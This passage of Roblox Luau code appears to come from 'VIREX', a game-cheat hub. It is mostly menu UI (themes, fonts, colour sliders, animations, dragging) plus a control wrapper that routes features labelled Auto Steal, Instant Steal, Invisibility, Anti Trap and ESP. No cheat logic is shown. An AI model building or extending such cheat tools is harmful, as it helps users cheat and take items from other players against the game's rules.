	glowFlash = math.max(0, glowFlash - dt * 1.4)
	glow.BackgroundTransparency = 0.85 - glowFlash * 0.4 + math.sin(clock * 2) * 0.03
	-- tilt: phone accelerometer, or the mouse on PC. Drives the glass light and the depth.
	local tc = CONFIG.Tilt or {}
	local tiltTarget = Vector2.new(0, 0)
	if tc.Enabled ~= false then
		local vp = viewport()
		if UserInputService.AccelerometerEnabled then
			local ok, g = pcall(function() return UserInputService:GetDeviceGravity() end)
			if ok and g and g.Position.Magnitude > 0.01 then
				local v = g.Position.Unit
				-- phones play in landscape, where the device's axes are swapped against the screen
				local raw = vp.X > vp.Y and Vector2.new(v.Y, v.X) or Vector2.new(v.X, -v.Y)
				-- the rest position slowly follows how you hold the phone, so only movement counts
				gravityRest = gravityRest and gravityRest:Lerp(raw, math.min(1, dt * 0.5)) or raw
				local d = (raw - gravityRest) * (tc.Strength or 3)
				tiltTarget = Vector2.new(math.clamp(d.X, -1, 1) * (tc.InvertX and -1 or 1), math.clamp(d.Y, -1, 1) * (tc.InvertY and -1 or 1))
			end
		elseif not isMobile then
			local m = UserInputService:GetMouseLocation()
			tiltTarget = Vector2.new((m.X / vp.X - 0.5) * 1.4, (m.Y / vp.Y - 0.5) * 1.4)
		end
	end
	tilt = tilt:Lerp(tiltTarget, math.min(1, dt * 5))
	if root.Visible or toastCurrent ~= nil then
		for i = #glassRims, 1, -1 do
			local r = glassRims[i]
			if r.g.Parent then r.g.Rotation = r.base + tilt.X * 70 + tilt.Y * 30 else table.remove(glassRims, i) end
		end
		for i = #glassSheens, 1, -1 do
			local g = glassSheens[i]
			if g.Parent then g.Offset = Vector2.new(0, tilt.Y * 0.35) g.Rotation = 90 - tilt.X * 25 else table.remove(glassSheens, i) end
		end
	end
	if root.Visible then
		-- depth: the photo, the orb and the light shift against each other
		photoHolder.Position = UDim2.new(0.5, -tilt.X * 18, 0.5, -tilt.Y * 14)
		specular.Position = UDim2.fromScale(0.5 + tilt.X * 0.4, 0.3 + tilt.Y * 0.35)
		specular.Rotation = -18 + tilt.X * 12
		for _, d in ipairs(dust) do
			local y = 1.05 - ((clock * d.sp + d.p) % 1) * 1.1
			d.f.Position = UDim2.new(d.x, math.sin(clock * 0.7 + d.p * 6) * 10 + tilt.X * 24 * d.depth, y, tilt.Y * 16 * d.depth)
			d.f.BackgroundTransparency = 0.45 + 0.5 * (1 - math.sin(((clock * d.sp + d.p) % 1) * math.pi)) + (1 - d.depth) * 0.2
		end
		for _, cf in ipairs(coverflows) do cf.step(dt) end
	end
	if titleText.group.Parent and math.floor(clock * 10) % 40 == 0 and math.floor((clock - dt) * 10) % 40 ~= 0 then sweepText(titleText, 0.8) end
	topLogo.Position = UDim2.fromOffset(38, 34 + math.sin(clock * 1.6) * 2)
end)

task.spawn(function()
	while gui.Parent do
		task.wait(3.5)
		if root.Visible then for _, sg in ipairs(logoShines) do if sg.Parent then shineLogo(sg) end end end
	end
end)
task.spawn(function()
	while gui.Parent do
		task.wait(4.5)
		if root.Visible then
			sweep.Position = UDim2.fromScale(-0.4, 0.5)
			tween(sweep, 1.4, { Position = UDim2.fromScale(1.4, 0.5) }, Enum.EasingStyle.Quart, INOUT)
		end
	end
end)

---------------------------------------------------------------------------
-- Pages
---------------------------------------------------------------------------
local toggleMenu, replayIntro

local blurOn = true

-- (inside do ... end so its variables stay local: Luau allows only 200 locals in the main body)
do
	local configPage = addPage("Config")
	-- Customize: a coverflow like the tabs. Static photos, motion (GIF) backgrounds, fonts, colours.
	Section(configPage, "Customize")
	configPage.order = configPage.order + 1
	local modeHolder = new("Frame", { Parent = configPage.scroll, Size = UDim2.new(1, 0, 0, 58), BackgroundTransparency = 1, LayoutOrder = configPage.order, ZIndex = 12 })
	Section(configPage, "Static backgrounds")
	local themeLabel = configPage.lastLabel
	local MODES = { "static", "motion", "fonts", "colors" }
	local MODE_TITLES = { "STATIC BACKGROUNDS", "MOTION BACKGROUNDS", "FONTS", "COLORS" }
	local entries = {}
	-- cards made inside fn() belong to that section
	local function tagCards(group, fn)
		local before = #cardsOf[configPage.name]
		fn()
		for i = before + 1, #cardsOf[configPage.name] do
			local e = cardsOf[configPage.name][i]
			table.insert(entries, { card = e.obj, scale = e.scale, group = group })
		end
	end
	local bgMode = themeSheet(currentTheme) and 2 or 1
	local function showMode(mode, animate)
		bgMode = mode
		themeLabel.Text = MODE_TITLES[mode]
		local k = 0
		for _, e in ipairs(entries) do
			local show = e.group == MODES[mode]
			e.card.Visible = show
			if show and animate then
				-- the new set deals itself in, one card after another
				k = k + 1
				e.scale.Scale = 0.6
				e.card.Rotation = (k % 2 == 0) and 7 or -7
				tween(e.scale, 0.65, { Scale = 1 }, BACK, OUT, k * 0.04)
				tween(e.card, 0.65, { Rotation = 0 }, Q, OUT, k * 0.04)
			end
		end
	end
	local setTheme, refreshColorUI
	local modeCf = coverflow(modeHolder, MODES, { width = 140, height = 42, spread = 112, z = 13, swipe = 120, textSize = 16, labels = { "STATIC", "MOTION", "FONTS", "COLORS" } }, function(i)
		if i == bgMode then return end
		showMode(i, true)
		-- picking a background type switches the window to it straight away, so you see it move (or stop)
		if i <= 2 and (themeSheet(currentTheme) ~= nil) ~= (i == 2) then
			for _, t in ipairs(CONFIG.Themes) do
				if (themeSheet(t) ~= nil) == (i == 2) then setTheme(t) break end
			end
		end
	end)
	modeCf.pos, modeCf.target, modeCf.lastStep = bgMode, bgMode, bgMode

	-- a check bubble and a ring that mark the chosen card
	local function markers(c, color)
		local check = new("TextLabel", { Parent = c, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(1, -24, 0.5, 0), Size = UDim2.fromOffset(0, 0), BackgroundColor3 = WHITE, Font = Enum.Font.GothamBlack, TextSize = 13, TextColor3 = color or BLACK, Text = "✓", ZIndex = 15 }, { corner() })
		local ring = stroke(WHITE, 1, 1)
		ring.Parent = c
		return check, ring
	end
	local function setMarked(m, on)
		tween(m.ring, 0.35, { Transparency = on and 0 or 1, Thickness = on and 3 or 1 })
		tween(m.check, 0.5, { Size = on and UDim2.fromOffset(24, 24) or UDim2.fromOffset(0, 0) }, BACK)
	end

	-- Backgrounds (static and motion)
	for _, t in ipairs(CONFIG.Themes) do
		tagCards(themeSheet(t) and "motion" or "static", function()
			local c, sc = card(configPage)
			-- each theme card previews its own photo (or its colours)
			if themeSheet(t) then
				-- animated preview
				local prev = new("ImageLabel", { Parent = c, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ScaleType = Enum.ScaleType.Crop, ImageTransparency = 0.1, ZIndex = 12 }, { corner(20) })
				applySheet(prev, themeSheet(t))
			elseif (t.Background or "") ~= "" then
				new("ImageLabel", { Parent = c, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Image = t.Background, ScaleType = Enum.ScaleType.Crop, ImageTransparency = 0.1, ZIndex = 12 }, { corner(20) })
			else
				new("Frame", { Parent = c, Size = UDim2.fromScale(1, 1), BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 12 }, { corner(20), new("UIGradient", { Rotation = 135, Color = seq({ t.Accent, t.Panel, t.Panel, t.Hot }) }) })
			end
			new("Frame", { Parent = c, Size = UDim2.fromScale(1, 1), BackgroundColor3 = BLACK, BorderSizePixel = 0, ZIndex = 12 }, { corner(20), new("UIGradient", { Rotation = 0, Transparency = nseq({ { 0, 0.15 }, { 0.6, 0.6 }, { 1, 0.9 } }) }) })
			for k, key in ipairs({ "Accent", "Accent2", "Hot" }) do
				local dot = new("Frame", { Parent = c, Position = UDim2.fromOffset(16 + (k - 1) * 16, 46), Size = UDim2.fromOffset(12, 12), BackgroundColor3 = t[key], ZIndex = 14 }, { corner() })
				stroke(WHITE, 1, 0.4).Parent = dot
			end
			fontProp(new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 14), Size = UDim2.new(1, -60, 0, 22), Font = FONT_HEAD, TextSize = 17, TextColor3 = WHITE, TextXAlignment = Enum.TextXAlignment.Left, Text = string.upper(t.Name), ZIndex = 14 }))
			local check, ring = markers(c, t.Accent)
			ring.Color = t.Accent2
			themeCards[t.Name] = { ring = ring, check = check }
			bind(c.Activated, function()
				rainbow = false
				pressBounce(sc, 0.9)
				burst(c, c.AbsoluteSize.X - 24, 37, t.Accent2, 12)
				sfx("Toggle", 1.1, 0.6)
				sfx("Open", 1.6, 0.3)
				setTheme(t)
			end)
		end)
	end

	-- Fonts: every card shows the name written in its own font
	local FONT_LIST = {
		"LuckiestGuy", "GothamBlack", "FredokaOne", "Bangers", "Michroma", "Sarpanch", "Oswald", "TitilliumWeb", "Jura", "Arcade",
		"SciFi", "Highway", "Cartoon", "PermanentMarker", "Creepster", "DenkOne", "GrenzeGotisch", "Nunito", "Ubuntu", "RobotoCondensed",
		"RobotoMono", "Merriweather", "SpecialElite", "Kalam", "PatrickHand", "IndieFlower", "AmaticSC", "Fondamento", "Bodoni", "Garamond",
		"Antique", "Fantasy", "SourceSansBold", "ArialBold",
	}
	local fontCards = {}
	local currentFontName = (CONFIG.Fonts or {}).Title or "LuckiestGuy"
	local function refreshFontCards()
		for name, m in pairs(fontCards) do setMarked(m, name == currentFontName) end
	end
	for _, fname in ipairs(FONT_LIST) do
		local f = pickFont(fname, nil)
		if f then
			tagCards("fonts", function()
				local c, sc = card(configPage)
				new("Frame", { Parent = c, Size = UDim2.fromScale(1, 1), BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 12 },
					{ corner(20), new("UIGradient", { Rotation = 120, Color = seq({ Color3.fromRGB(40, 41, 48), Color3.fromRGB(10, 10, 12), Color3.fromRGB(26, 26, 31) }), Transparency = nseq({ { 0, 0.15 }, { 1, 0.3 } }) }) })
				local sample = new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 6), Size = UDim2.new(1, -60, 0, 42), Font = f, TextSize = 30, TextColor3 = WHITE, TextXAlignment = Enum.TextXAlignment.Left, TextScaled = false, Text = "VIREX", ZIndex = 14 })
				new("UIGradient", { Parent = sample, Rotation = 90, Color = seq({ WHITE, Color3.fromRGB(196, 198, 206) }) })
				new("UIStroke", { Parent = sample, Color = BLACK, Thickness = 1.5, LineJoinMode = Enum.LineJoinMode.Round })
				new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 50), Size = UDim2.new(1, -60, 0, 14), Font = Enum.Font.GothamMedium, TextSize = 11, TextColor3 = Theme.Muted, TextXAlignment = Enum.TextXAlignment.Left, Text = fname:gsub("(%l)(%u)", "%1 %2"), ZIndex = 14 })
				local check, ring = markers(c)
				fontCards[fname] = { ring = ring, check = check }
				bind(c.Activated, function()
					pressBounce(sc, 0.9)
					burst(c, c.AbsoluteSize.X - 24, 37, WHITE, 12)
					sfx("Toggle", 1.2, 0.6)
					currentFontName = fname
					setFonts(f)
					refreshFontCards()
					notify("Font", fname:gsub("(%l)(%u)", "%1 %2"), 2, Theme.Accent2)
				end)
			end)
		end
	end

	-- Colours: pick what to paint, then use the palette or the hue / saturation / brightness sliders
	local COLOR_KEYS = { { "Accent", "Accent", "Toggles, sliders, borders" }, { "Accent2", "Glow", "Highlights and labels" }, { "Panel", "Window", "The window behind everything" }, { "Card", "Buttons", "The glass cards" }, { "Text", "Text", "Titles and labels" } }
	local colorKey = "Accent"
	local colorCards = {}
	local syncing = false
	local hsv = { 0, 0, 100 }
	local hueS, satS, valS
	local function paint(key, c)
		Theme[key] = c
		for _, a in ipairs(themed) do
			if a.key == key and a.inst.Parent then tween(a.inst, 0.25, { [a.prop] = c }) end
		end
		if colorCards[key] then tween(colorCards[key].swatch, 0.25, { BackgroundColor3 = c }) end
	end
	local function applyHSV()
		if syncing then return end
		paint(colorKey, Color3.fromHSV(hsv[1] / 360, hsv[2] / 100, hsv[3] / 100))
	end
	refreshColorUI = function()
		for key, cc in pairs(colorCards) do
			cc.swatch.BackgroundColor3 = Theme[key]
			setMarked(cc, key == colorKey)
		end
		if hueS then
			local h, s, v = Theme[colorKey]:ToHSV()
			hsv = { math.floor(h * 360 + 0.5), math.floor(s * 100 + 0.5), math.floor(v * 100 + 0.5) }
			syncing = true
			hueS.set(hsv[1]) satS.set(hsv[2]) valS.set(hsv[3])
			syncing = false
		end
	end
	tagCards("colors", function()
		for _, ck in ipairs(COLOR_KEYS) do
			local key = ck[1]
			local c, sc = card(configPage)
			cardText(c, ck[2], ck[3], 84)
			local swatch = new("Frame", { Parent = c, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -46, 0.5, 0), Size = UDim2.fromOffset(30, 30), BackgroundColor3 = Theme[key], ZIndex = 14 }, { corner() })
			stroke(WHITE, 2, 0.2).Parent = swatch
			local check, ring = markers(c)
			colorCards[key] = { swatch = swatch, ring = ring, check = check }
			bind(c.Activated, function()
				pressBounce(sc, 0.93)
				sfx("Click", 1.3, 0.5)
				colorKey = key
				refreshColorUI()
			end)
		end
		-- palette: 14 quick colours
		local pc = card(configPage)
		new("TextLabel", { Parent = pc, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 6), Size = UDim2.new(1, -32, 0, 14), Font = Enum.Font.GothamBold, TextSize = 11, TextColor3 = Theme.Muted, TextXAlignment = Enum.TextXAlignment.Left, Text = "PALETTE", ZIndex = 13 })
		local PALETTE = {
			Color3.fromRGB(255, 255, 255), Color3.fromRGB(200, 202, 210), Color3.fromRGB(120, 122, 130), Color3.fromRGB(30, 30, 36), Color3.fromRGB(8, 8, 10), Color3.fromRGB(255, 60, 92), Color3.fromRGB(255, 140, 50),
			Color3.fromRGB(255, 214, 80), Color3.fromRGB(60, 220, 140), Color3.fromRGB(60, 200, 255), Color3.fromRGB(47, 107, 255), Color3.fromRGB(138, 76, 255), Color3.fromRGB(255, 110, 210), Color3.fromRGB(150, 110, 70),
		}
		for i, col in ipairs(PALETTE) do
			local row, colI = math.floor((i - 1) / 7), (i - 1) % 7
			local sw = new("TextButton", { Parent = pc, Position = UDim2.new(colI / 7, 12, 0, 24 + row * 24), Size = UDim2.fromOffset(20, 20), BackgroundColor3 = col, AutoButtonColor = false, Text = "", ZIndex = 14 }, { corner() })
			stroke(WHITE, 1, 0.4).Parent = sw
			local ssc = new("UIScale", { Parent = sw })
			bind(sw.Activated, function()
				pressBounce(ssc, 0.7)
				sfx("Toggle", 1.4, 0.4)
				paint(colorKey, col)
				refreshColorUI()
			end)
		end
		hueS = Slider(configPage, "Hue", 0, 360, 0, "°", function(v) hsv[1] = v applyHSV() end)
		satS = Slider(configPage, "Saturation", 0, 100, 0, "%", function(v) hsv[2] = v applyHSV() end)
		valS = Slider(configPage, "Brightness", 0, 100, 100, "%", function(v) hsv[3] = v applyHSV() end)
		Button(configPage, "Reset colors", "Back to the theme's colours", "Reset", function()
			setTheme(currentTheme, true)
			notify("Colors", "Reset to " .. currentTheme.Name, 2, Theme.Accent2)
		end)
	end)

	setTheme = function(t, quiet)
		paint("Text", Color3.fromRGB(244, 247, 252))
		applyTheme(t, quiet)
		refreshColorUI()
	end
	Section(configPage, "Menu")
	Button(configPage, "Replay intro", "Watch the VIREX intro again", "Play", function() replayIntro() end)
	Info(configPage, "Toggle key", CONFIG.ToggleKey.Name)
	refreshThemeCards()
	refreshFontCards()
	refreshColorUI()
	showMode(bgMode, false)
end

-- every label in the pages gets a soft dark outline, so it stays sharp over any background
for _, d in ipairs(content:GetDescendants()) do
	if d:IsA("TextLabel") and not d:FindFirstChildOfClass("UIStroke") then
		new("UIStroke", { Parent = d, Color = BLACK, Thickness = 1, Transparency = 0.45, LineJoinMode = Enum.LineJoinMode.Round })
	end
	if d:IsA("TextLabel") and d.TextColor3 == Theme.Text then themeProp(d, "TextColor3", "Text") end
end

---------------------------------------------------------------------------
-- Dragging the window (mouse and touch), with a little sway
---------------------------------------------------------------------------
do
	local dragging, startPos, startInput = false, nil, nil
	bind(topbar.InputBegan, function(input)
		local p, a, sz = input.Position, deck.AbsolutePosition, deck.AbsoluteSize
		local onPill = p.X >= a.X and p.X <= a.X + sz.X and guiY(p.Y) >= a.Y and guiY(p.Y) <= a.Y + sz.Y
		if isPress(input) and not onPill and not carousel.dragging then
			dragging, startPos, startInput = true, root.Position, input.Position
			tween(rootScale, 0.3, { Scale = fitScale() * 0.97 }, BACK)
		end
	end)
	bind(UserInputService.InputEnded, function(input)
		if dragging and isPress(input) then
			dragging = false
			tween(rootScale, 0.6, { Scale = fitScale() }, ELASTIC, OUT)
			tween(root, 0.6, { Rotation = 0 }, ELASTIC, OUT)
		end
	end)
	bind(UserInputService.InputChanged, function(input)
		if dragging and isMove(input) then
			local d = input.Position - startInput
			tween(root, 0.18, { Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y), Rotation = math.clamp(input.Delta.X * 0.15, -3, 3) }, QUAD)
		end
	end)
end

---------------------------------------------------------------------------
-- Floating button (shown while the menu is closed)
---------------------------------------------------------------------------
local fab = new("TextButton", { Parent = gui, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0, 52, 0.5, 0), Size = UDim2.fromOffset(68, 68), BackgroundColor3 = Theme.Panel, AutoButtonColor = false, Text = "", Visible = false, ZIndex = 60, ClipsDescendants = false }, { corner(20) })
themeProp(fab, "BackgroundColor3", "Panel")
liquidGlass(fab, 0.1)
local fabSwirl = new("Frame", { Parent = fab, Size = UDim2.fromScale(1, 1), BackgroundColor3 = WHITE, BackgroundTransparency = 0, ZIndex = 60 }, { corner(20) })
spinGradient(new("UIGradient", { Parent = fabSwirl, Color = seq({ Color3.fromRGB(40, 41, 48), Color3.fromRGB(12, 12, 15), Color3.fromRGB(58, 60, 68), Color3.fromRGB(12, 12, 15), Color3.fromRGB(40, 41, 48) }) }), 60)
local fabRing = stroke(WHITE, 2.6, 0)
fabRing.Parent = fab
spinGradient(themedBorder(new("UIGradient", { Parent = fabRing })), 170)
local fabLogo = new("ImageLabel", { Parent = fab, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromScale(0.74, 0.74), BackgroundTransparency = 1, Image = CONFIG.LogoImage, ZIndex = 62 })
local fabShine = new("ImageLabel", { Parent = fabLogo, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Image = CONFIG.LogoImage, ImageColor3 = WHITE, ZIndex = 63 })
table.insert(logoShines, new("UIGradient", { Parent = fabShine, Rotation = 25, Offset = Vector2.new(-1, 0), Transparency = nseq({ { 0, 1 }, { 0.4, 1 }, { 0.5, 0.1 }, { 0.6, 1 }, { 1, 1 } }) }))
local fabScale = new("UIScale", { Parent = fab, Scale = 0 })
local fabPulse = new("Frame", { Parent = fab, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ZIndex = 59 }, { corner(22) })
local fabPulseStroke = stroke(Theme.Accent2, 2, 1)
fabPulseStroke.Parent = fabPulse
task.spawn(function()
	while gui.Parent do
		if fab.Visible then
			for _, sg in ipairs(logoShines) do if sg.Parent == fabShine then shineLogo(sg) end end
			tween(fabLogo, 1.8, { Rotation = 5 }, SINE, INOUT).Completed:Wait()
			tween(fabLogo, 1.8, { Rotation = -5 }, SINE, INOUT).Completed:Wait()
		else
			task.wait(0.3)
		end
	end
end)
do
	local dragging, moved, startPos, startInput = false, 0, nil, nil
	bind(fab.InputBegan, function(input)
		if isPress(input) then
			dragging, moved, startPos, startInput = true, 0, fab.Position, input.Position
			tween(fabScale, 0.2, { Scale = 0.9 }, Q)
		end
	end)
	bind(UserInputService.InputChanged, function(input)
		if dragging and isMove(input) then
			local d = input.Position - startInput
			moved = math.max(moved, d.Magnitude)
			fab.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
		end
	end)
	bind(UserInputService.InputEnded, function(input)
		if dragging and isPress(input) then
			dragging = false
			tween(fabScale, 0.5, { Scale = 1 }, BACK, OUT)
			if moved < 8 then toggleMenu() end
		end
	end)
	bind(fab.MouseEnter, function() if not dragging and fab.Visible then tween(fabScale, 0.5, { Scale = 1.08 }, Q) end end)
	bind(fab.MouseLeave, function() if not dragging and fab.Visible then tween(fabScale, 0.5, { Scale = 1 }, Q) end end)
end

---------------------------------------------------------------------------
-- Open / close
---------------------------------------------------------------------------
local isOpen, busy = false, false
local fabToken = 0
local function showFab(show)
	fabToken = fabToken + 1
	local my = fabToken
	if show then
		-- the button floats in gently: grows, turns a little and settles
		fab.Visible = true
		fabScale.Scale = 0.2
		fab.Rotation = -25
		fabLogo.ImageTransparency = 1
		tween(fabScale, 0.9, { Scale = 1 }, Q, OUT)
		tween(fab, 1, { Rotation = 0 }, Q, OUT)
		tween(fabLogo, 0.8, { ImageTransparency = 0 }, SINE, OUT, 0.2)
		for _, sg in ipairs(logoShines) do if sg.Parent == fabShine then task.delay(0.6, function() shineLogo(sg) end) end end
	else
		tween(fabScale, 0.45, { Scale = 0 }, Q, IN)
		tween(fab, 0.45, { Rotation = 25 }, Q, IN)
		task.delay(0.45, function() if my == fabToken then fab.Visible = false end end)
	end
end

local function open()
	if isOpen or busy then return end
	busy, isOpen = true, true
	rootScale.Scale = fitScale()
	root.Rotation = 0
	root.Visible = true
	showFab(false)
	sfx("Open", 1, 0.7)
	if blurOn then setBlur(16) end
	-- 1) the tab carousel slides in from the right, its tabs spinning into place
	deck.Position = deckBase + UDim2.fromOffset(460, 0)
	deck.GroupTransparency = 1
	carousel.pos = carousel.target + 2.6
	carousel.vel = 0
	tween(deck, 0.85, { Position = deckBase }, Q, OUT)
	tween(deck, 0.6, { GroupTransparency = 0 }, SINE, OUT)
	-- 2) then the window rises out of the glass
	window.GroupTransparency = 1
	winScale.Scale = 0.86
	borderScale.Scale = 0.86
	borderStroke.Transparency = 1
	tween(window, 0.75, { GroupTransparency = 0 }, SINE, OUT, 0.35)
	tween(winScale, 0.95, { Scale = 1 }, Q, OUT, 0.35)
	tween(borderScale, 0.95, { Scale = 1 }, Q, OUT, 0.35)
	tween(borderStroke, 0.9, { Transparency = 0 }, SINE, OUT, 0.45)
	task.delay(0.35, function() sfx("Toggle", 0.8, 0.35) end)
	-- a band of light sweeps across as it lands
	task.delay(0.6, function()
		sweep.Position = UDim2.fromScale(-0.4, 0.5)
		tween(sweep, 1.2, { Position = UDim2.fromScale(1.4, 0.5) }, Enum.EasingStyle.Quart, INOUT)
	end)
	task.delay(0.45, function() flip(topLogo, 40, 1, 0.3) end)
	glowFlash = 1
	for i, obj in ipairs({ title, minBtn, closeBtn }) do
		local sc = obj:FindFirstChild("Pop") or new("UIScale", { Parent = obj, Name = "Pop" })
		sc.Scale = 0.5
		tween(sc, 0.7, { Scale = 1 }, BACK, OUT, 0.5 + i * 0.07)
	end
	task.delay(0.9, function() for _, sg in ipairs(logoShines) do if sg.Parent then shineLogo(sg) end end end)
	if not currentTab then
		task.delay(0.35, function() selectTab(TAB_NAMES[1]) end)
	else
		carousel.target = tabIndex[currentTab]
		task.delay(0.35, function() cascadeIn(currentTab) end)
	end
	task.delay(1, function() busy = false end)
end

local function close()
	if not isOpen or busy then return end
	busy, isOpen = true, false
	sfx("Close", 1.2, 0.55)
	-- 1) the window sinks back into the glass
	tween(window, 0.5, { GroupTransparency = 1 }, SINE, IN)
	tween(winScale, 0.55, { Scale = 0.9 }, Q, IN)
	tween(borderScale, 0.55, { Scale = 0.9 }, Q, IN)
	tween(borderStroke, 0.4, { Transparency = 1 }, SINE, IN)
	-- 2) the tabs slide out to the right after it
	tween(deck, 0.6, { Position = deckBase + UDim2.fromOffset(460, 0) }, Q, IN, 0.2)
	tween(deck, 0.5, { GroupTransparency = 1 }, SINE, IN, 0.3)
	setBlur(0)
	task.delay(0.85, function()
		root.Visible = false
		busy = false
		showFab(true)
	end)
end

toggleMenu = function() if isOpen then close() else open() end end

local function destroyAll()
	close()
	task.wait(0.9)
	tween(fabScale, 0.4, { Scale = 0 }, Q, IN)
	for _, c in ipairs(connections) do c:Disconnect() end
	tween(blur, 0.3, { Size = 0 })
	task.wait(0.35)
	blur:Destroy()
	gui:Destroy()
end

replayIntro = function()
	close()
	task.wait(0.9)
	fab.Visible = false
	playIntro(open)
end

bind(minBtn.Activated, close)
bind(closeBtn.Activated, function()
	notify("VIREX", "Closed. Run the script again to reopen.", 2, Theme.Bad)
	task.spawn(destroyAll)
end)
bind(UserInputService.InputBegan, function(input, processed)
	if processed then return end
	if input.KeyCode == CONFIG.ToggleKey then toggleMenu() end
end)
bind(camera:GetPropertyChangedSignal("ViewportSize"), function()
	if isOpen then rootScale.Scale = fitScale() end
end)
bind(topbar.MouseEnter, function() flip(topLogo, 40, 1, 0.14) end)


---------------------------------------------------------------------------
-- VIREX SAE HUB: solo las funciones importantes se muestran.
-- El resto sigue funcionando por dentro con sus valores normales, sin UI (menos lag).
---------------------------------------------------------------------------
local Lib = { Name = "Virex" }
do
	local ROUTES = {
		["Auto Steal"] = { page = "Farm", title = "Steal", only = { ["Auto Steal"] = true, ["Instant Steal"] = true, ["Instant Steal Steps"] = true, ["Target Areas"] = true, ["Target Rarities"] = true } },
		["Character"] = { page = "Protect", title = "Protection", only = { ["Invisibility"] = true, ["Anti Ragdoll"] = true, ["Anti Trap"] = true } },
		["ESP"] = { page = "ESP", title = "ESP" },
		["Dr Scramble Lab & Mech"] = { page = "Events", title = "Dr Scramble Event" },
	}
	local hubPages = {}
	for _, n in ipairs(TAB_NAMES) do
		if n ~= "Config" then hubPages[n] = addPage(n) end
	end

	local function safeCall(fn, ...)
		if type(fn) ~= "function" then return end
		local ok, err = pcall(fn, ...)
		if not ok then warn("[Virex] callback error: " .. tostring(err)) end
	end
	local function outline(c)
		for _, d in ipairs(c:GetDescendants()) do
			if d:IsA("TextLabel") and not d:FindFirstChildOfClass("UIStroke") then
				new("UIStroke", { Parent = d, Color = BLACK, Thickness = 1, Transparency = 0.45, LineJoinMode = Enum.LineJoinMode.Round })
			end
		end
	end

	-- Handles
	local Handle = {}
	Handle.__index = Handle
	local function effectiveVisible(h)
		local p = h._parent
		if p then
			if p._kind == "toggle" and p._value ~= true then return false end
			if not effectiveVisible(p) then return false end
		end
		local sw = h._showWhen
		if type(sw) == "table" and sw._kind == "toggle" and sw._value ~= true then return false end
		if type(sw) == "function" then
			local ok, r = pcall(sw)
			if ok and not r then return false end
		end
		return true
	end
	local function refreshAll(win)
		for _, h in ipairs(win._items) do
			if h._row and h._row.Parent then h._row.Visible = (not h._removed) and effectiveVisible(h) end
		end
	end
	local function newHandle(sec, o, kind)
		local h = setmetatable({}, Handle)
		h._kind, h._win, h._opts, h._enabled = kind, sec._win, o, true
		h._parent = type(o.SubOf) == "table" and o.SubOf or nil
		h._showWhen = o.ShowWhen
		h._controller = { GetValue = function() return h._value end, SetValue = function(v) h:Set(v) end }
		table.insert(sec._win._items, h)
		return h
	end
	function Handle:Get() return self._value end
	function Handle:GetValue() return self._value end
	function Handle:SetValue(v) return self:Set(v) end
	function Handle:Set() end
	function Handle:Enable() self._enabled = true end
	function Handle:Disable() self._enabled = false end
	function Handle:Destroy()
		self._removed = true
		if self._row then self._row:Destroy() end
		for i, h in ipairs(self._win._items) do
			if h == self then table.remove(self._win._items, i) break end
		end
	end
	function Handle:JoinExclusiveGroup(g)
		if type(g) ~= "table" then return end
		self._group = g
		table.insert(g.Members, self)
	end
	function Handle:_fire(v) safeCall(self._opts.Callback, v) end
	local function queueInit(h, fn)
		local win = h._win
		local f = function() if not h._removed then fn() end end
		if win._ready then task.defer(f) else table.insert(win._initQueue, f) end
	end

	-- donde va cada control: devuelve la pagina (con la cuadricula ya puesta) o nil = sin UI
	local SectionT = {}
	SectionT.__index = SectionT
	local function place(sec, o)
		local r = sec._route
		if not r then return nil end
		if r.only and not r.only[tostring(o.Name)] then return nil end
		local pg = hubPages[r.page]
		if not sec._grid then
			local prev = pg.grid
			Section(pg, r.title)
			sec._grid = pg.grid
			pg.grid = prev
		end
		return pg
	end
	local function build(pg, sec, fn)
		local prev = pg.grid
		pg.grid = sec._grid
		local ok, a, b = pcall(fn)
		pg.grid = prev
		if not ok then warn("[Virex] " .. tostring(a)) return nil end
		return a, b
	end
	local function lastCard(pg)
		local list = cardsOf[pg.name]
		local e = list[#list]
		return e and e.obj
	end

	-- TOGGLE
	function SectionT:CreateToggle(o)
		o = o or {}
		local h = newHandle(self, o, "toggle")
		h._value = o.Default == true
		local native
		local function onChange(v)
			v = v == true
			h._value = v
			if v and h._group then
				local max, active = tonumber(h._group.MaxActive) or 1, 0
				for _, m in ipairs(h._group.Members) do if m ~= h and m._value == true then active = active + 1 end end
				for _, m in ipairs(h._group.Members) do
					if active < max then break end
					if m ~= h and m._value == true then m:Set(false) active = active - 1 end
				end
			end
			refreshAll(h._win)
			h:_fire(v)
		end
		local pg = place(self, o)
		if pg then
			native = build(pg, self, function() return Toggle(pg, tostring(o.Name or ""), o.Note, h._value, onChange) end)
			h._row = lastCard(pg)
			if h._row then outline(h._row) end
		end
		function h:Set(v)
			v = v == true
			if v == self._value then return end
			if native then native.set(v) else onChange(v) end
		end
		queueInit(h, function() h:_fire(h._value) end)
		refreshAll(h._win)
		return h
	end

	-- SLIDER
	function SectionT:CreateSlider(o)
		o = o or {}
		local h = newHandle(self, o, "slider")
		local minV, maxV = tonumber(o.Min) or 0, tonumber(o.Max) or 100
		local inc = tonumber(o.Increment) or 1
		local allowDec = o.AllowDecimals == true or inc < 1
		local unit = type(o.Unit) == "string" and o.Unit or ""
		local function snap(v)
			v = math.clamp(tonumber(v) or minV, minV, maxV)
			if inc > 0 then v = minV + math.floor((v - minV) / inc + 0.5) * inc end
